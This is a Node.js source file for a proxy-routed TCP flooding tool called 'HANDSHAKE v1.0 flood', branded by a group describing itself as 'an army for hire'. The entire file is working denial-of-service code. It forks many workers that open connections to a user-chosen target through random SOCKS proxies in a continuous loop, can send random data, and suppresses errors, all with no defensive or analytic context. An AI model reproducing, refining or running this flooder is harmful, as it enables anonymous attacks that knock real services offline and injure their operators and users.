/*
    HANDSHAKE v1.0 flood
    
    (6 June, 2024)

    Features:
    - Optional data randomization
    - Advanced debugging
    - Socks4/5 support

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga

    t.me/benshii

    npm install socks colors

    Tested on node v18.19.1
*/

const fs = require('fs');
const cluster = require('cluster');
const { SocksClient } = require('socks');
const colors = require('colors');

process.on("uncaughtException", function (error) { /* console.log(error) */ });
process.on("unhandledRejection", function (error) { /* console.log(error) */ });
process.setMaxListeners(0);

if (process.argv.length < 7) {
  console.clear();
  console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
  console.log('')
  console.log(colors.cyan("                        t.me/benshii"));
  console.log(`
  ${`${'HANDSHAKE v1.0 flood'.underline} | Optional data randomization, advanced debugging, socks4/5 support`.italic}

  ${'Usage:'.bold.underline}

      ${`node HANDSHAKE.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
      ${'node HANDSHAKE.js 1.1.1.1:80 300 5 socks5.txt --debug true --socks 5'.italic}

  ${'Options:'.bold.underline}

      --debug         ${'true'.green}        ${'-'.red.bold}   ${`Enable socket debugging.`.italic}
      --write         ${'true'.green}        ${'-'.red.bold}   ${`Write random data.`.italic}
      --socks         ${'4'.yellow}/${'5'.yellow}         ${'-'.red.bold}   ${'Socks version [4: socks4], [5: socks5].'.italic}
  `);
  process.exit(0)
};

const target = process.argv[2]
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const proxyfile = process.argv[5] || 'socks.txt';

let address, port;

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

try {
  [address, port] = target.split(':')
} catch (e) {
  console.log("Invalid target format (ip:port)!")
}

function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
  { flag: '--debug', value: get_option('--debug') },
  { flag: '--write', value: get_option('--write') },
  { flag: '--socks', value: get_option('--socks') }
];

function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}

function random_string(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const socket_target = {
  host: address,
  port: parseInt(port)
};

function log(string) {
  let d = new Date();
  let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
  let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

  if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
      hours = "undefined";
      minutes = "undefined";
      seconds = "undefined";
  }

  if (enabled('debug')) {
    console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) ${string}`);
  }
}

function main() {
  let proxy;
  var _proxy = proxies[Math.floor(Math.random() * proxies.length)];
  proxy = _proxy.split(':');

  let version = 5;
  const socks_version = enabled('socks');

  if (socks_version) {
    switch(socks_version) {
      case 4:
        version = 4;
        break;
      case 5:
        version = 5;
        break;
      default:
        break;
    }
  }

  const socket_proxy = {
    host: proxy[0],
    port: parseInt(proxy[1]),
    type: version
  };
  
  SocksClient.createConnection({
    proxy: socket_proxy,
    command: 'connect',
    destination: socket_target,
    set_tcp_nodelay: true,
    timeout: 10000,
  }).then(info => {
    log(`[HANDSHAKE] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.green(`Connected to target`)}`);
    const socket = info.socket;
    socket.on('data', (data) => {
      socket.close();
    });

    if (enabled('write')) {
      setInterval(async () => {
        socket.write(random_string(7));
      }, 100)()
    }
  
    socket.on('error', (err) => {
      log(`[HANDSHAKE] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.red(`Socket error: ${err}`)}`);
    });
  
    socket.on('close', () => {
      log(`[HANDSHAKE] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.cyan(`Handshake completed`)}`);
    });
  
    socket.end();
  }).catch(err => {
    log(`[HANDSHAKE] | (${colors.magenta(`${proxy[0]}`.underline)}) ${colors.yellow(`Socket connection failed`)}`);
  });
}


if (cluster.isMaster) {

  let _options = ""
  for (var x = 0; x < options.length; x++) {
      if (options[x].value !== undefined) {
          _options += `${(options[x].flag).replace('--', '')}, `;
      }
  }

  console.clear();
  console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
  console.log('')
  console.log(colors.cyan("                        t.me/benshii"));
  console.log(`
          ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`HANDSHAKE`.italic} ${']'.red} 
          ${'TARGET'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
          ${'TIME'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
          ${'THREADS'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
          ${'OPTIONS'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

  for (var i = 0; i < threads; i++) {
      cluster.fork();
  }
  setTimeout(() => {
      process.exit(-1);
  }, duration * 1000)
} else {
  setInterval(main)
}
